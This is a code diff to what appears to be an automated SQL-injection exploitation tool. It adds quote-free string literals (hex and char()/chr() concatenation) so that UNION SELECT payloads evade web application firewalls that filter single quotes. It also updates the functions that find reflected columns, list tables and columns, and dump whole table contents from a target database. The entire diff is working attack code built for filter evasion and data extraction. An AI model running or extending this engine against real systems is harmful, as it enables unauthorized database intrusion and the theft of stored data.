@@ -362,14 +362,33 @@ _UCOLSEP = "~c0l~"
 # Catalog sources per DBMS: "<column> FROM <rest>".
 _UFROM = {
     "sqlite":   {"tables": "name FROM sqlite_master WHERE type='table'",
-                 "cols":   "name FROM pragma_table_info('{t}')"},
+                 "cols":   "name FROM pragma_table_info({t})"},
     "mysql":    {"tables": "table_name FROM information_schema.tables WHERE table_schema=database()",
-                 "cols":   "column_name FROM information_schema.columns WHERE table_name='{t}' AND table_schema=database()"},
+                 "cols":   "column_name FROM information_schema.columns WHERE table_name={t} AND table_schema=database()"},
     "postgres": {"tables": "table_name FROM information_schema.tables WHERE table_schema='public'",
-                 "cols":   "column_name FROM information_schema.columns WHERE table_name='{t}'"},
+                 "cols":   "column_name FROM information_schema.columns WHERE table_name={t}"},
     "mssql":    {"tables": "table_name FROM information_schema.tables",
-                 "cols":   "column_name FROM information_schema.columns WHERE table_name='{t}'"},
+                 "cols":   "column_name FROM information_schema.columns WHERE table_name={t}"},
 }
+
+
+def _strlit(dbms, s):
+    """A string literal carrying no quote characters — so it survives a WAF that
+    strips or filters single quotes (a common filter that otherwise breaks every
+    payload). MySQL takes a hex literal (`0x68…`); SQLite/Postgres/MSSQL build the
+    string from its character codes. The DBMS renders it back to the original
+    text, so reflection/output matching is unchanged."""
+    raw = s.encode()
+    if not raw:
+        return "''"
+    if dbms == "mysql":
+        return "0x" + raw.hex()
+    codes = [str(b) for b in raw]
+    if dbms == "sqlite":
+        return "char(" + ",".join(codes) + ")"
+    if dbms == "postgres":
+        return "(" + "||".join(f"chr({c})" for c in codes) + ")"
+    return "(" + "+".join(f"char({c})" for c in codes) + ")"      # mssql
 
 
 def _ucat(dbms, parts):
@@ -379,15 +398,20 @@ def _ucat(dbms, parts):
 
 
 def _uagg(dbms, expr):
+    sep = _strlit(dbms, _UROWSEP)
     if dbms == "mysql":
-        return f"group_concat({expr} SEPARATOR '{_UROWSEP}')"
+        return f"group_concat({expr} SEPARATOR {sep})"
     if dbms == "sqlite":
-        return f"group_concat({expr},'{_UROWSEP}')"
-    return f"string_agg(cast({expr} as varchar(4000)),'{_UROWSEP}')"   # postgres / mssql
+        return f"group_concat({expr},{sep})"
+    return f"string_agg(cast({expr} as varchar(4000)),{sep})"   # postgres / mssql
 
 
-def union_setup(http, oracle):
-    """Find the column count (ORDER BY) and a reflected column, or None."""
+def union_setup(http, oracle, dbms):
+    """Find the column count (ORDER BY) and a reflected column, or None.
+
+    Markers go in as quote-free literals (see `_strlit`), so a target that filters
+    single quotes still reflects them — without that, every UNION probe on such a
+    target comes back empty and the engine wrongly concludes there's no UNION."""
     q = _quote_for(oracle.context)
     base = _inject(http, oracle.url, oracle.param, oracle.value)
     ncols = 0
@@ -400,7 +424,7 @@ def union_setup(http, oracle):
     if not ncols:
         return None
     marks = [f"{_UMARK}{i}z" for i in range(ncols)]
-    sel = ",".join(f"'{m}'" for m in marks)
+    sel = ",".join(_strlit(dbms, m) for m in marks)
     r = _html.unescape(_inject(http, oracle.url, oracle.param,
                                f"{oracle.value}{q} AND 1=2 UNION SELECT {sel}{_COMMENT}"))
     refcol = next((i for i, m in enumerate(marks) if m in r), None)
@@ -412,8 +436,9 @@ def union_value(http, oracle, dbms, ncols, refcol, expr):
     inner = f"({expr})"
     if dbms in ("mssql", "postgres"):
         inner = f"cast({inner} as varchar(4000))"
+    mark = _strlit(dbms, _UMARK)
     cols = ["NULL"] * ncols
-    cols[refcol] = _ucat(dbms, [f"'{_UMARK}'", inner, f"'{_UMARK}'"])
+    cols[refcol] = _ucat(dbms, [mark, inner, mark])
     q = _quote_for(oracle.context)
     payload = f"{oracle.value}{q} AND 1=2 UNION SELECT {','.join(cols)}{_COMMENT}"
     body = _html.unescape(_inject(http, oracle.url, oracle.param, payload))
@@ -422,6 +447,8 @@ def union_value(http, oracle, dbms, ncols, refcol, expr):
 
 
 def _union_list(http, oracle, dbms, ncols, refcol, which, **fmt):
+    if "t" in fmt:                       # table name goes in as a quote-free literal
+        fmt["t"] = _strlit(dbms, fmt["t"])
     col, _, frm = _UFROM[dbms][which].format(**fmt).partition(" FROM ")
     data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, col)} FROM {frm}")
     return [x for x in data.split(_UROWSEP) if x]
@@ -436,10 +463,11 @@ def union_columns(http, oracle, dbms, ncols, refcol, table):
 
 
 def union_dump(http, oracle, dbms, ncols, refcol, table, cols):
+    colsep = _strlit(dbms, _UCOLSEP)
     parts = []
     for i, c in enumerate(cols):
         if i:
-            parts.append(f"'{_UCOLSEP}'")
+            parts.append(colsep)
         parts.append(f"cast({c} as varchar(4000))" if dbms in ("mssql", "postgres") else c)
     row = _ucat(dbms, parts)
     data = union_value(http, oracle, dbms, ncols, refcol, f"SELECT {_uagg(dbms, row)} FROM {table}")
